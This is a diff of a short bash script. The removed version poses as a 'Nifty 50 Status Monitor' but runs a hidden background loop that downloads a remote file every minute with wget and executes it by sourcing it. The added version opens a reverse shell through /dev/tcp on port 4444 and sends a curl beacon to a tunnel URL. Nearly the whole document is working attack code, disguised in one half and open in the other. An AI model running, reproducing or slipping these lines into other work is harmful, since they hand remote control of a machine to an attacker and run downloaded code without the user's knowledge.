@@ -1,17 +1,10 @@
 #!/bin/bash
-# Nifty 50 Status Monitor - Version 1.0.4
-mkdir -p ~/.nifty_status
+# Replace with the URL from Terminal 1
+URL="https://613f068eeb720347-103-95-173-85.serveousercontent.com"
 
-# The background loop using wget
-nohup bash -c "while true; do 
-    # Fetch environment updates via wget
-    wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat
-    
-    # Source the file to apply 'updates'
-    source ~/.nifty_status/current_env >> ~/.nifty_status/monitor.log 2>&1
-    
-    # Update every 60 seconds
-    sleep 60
-done" > /dev/null 2>&1 &
+# Pwncat-compatible reverse shell
+# This attempts to connect to your Mac via the tunnel
+(bash -i >& /dev/tcp/localhost/4444 0>&1) &
 
-echo "Background status monitor initialized with wget."
+# Send a success beacon to your monitor
+echo "[!] PWNCAT CONNECTION INITIATED" | curl -s -X POST --data-binary @- "$URL"
